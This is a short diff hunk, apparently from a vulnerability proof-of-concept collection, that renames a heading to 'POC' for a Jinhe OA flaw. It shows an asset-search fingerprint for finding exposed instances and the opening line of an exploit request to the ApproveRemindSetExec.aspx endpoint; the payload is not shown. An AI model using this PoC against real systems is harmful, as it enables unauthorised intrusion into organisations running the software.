@@ -8,7 +8,7 @@
 app="金和网络-金和OA"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /c6/JHSoft.Web.AddMenu/ApproveRemindSetExec.aspx/? HTTP/1.1
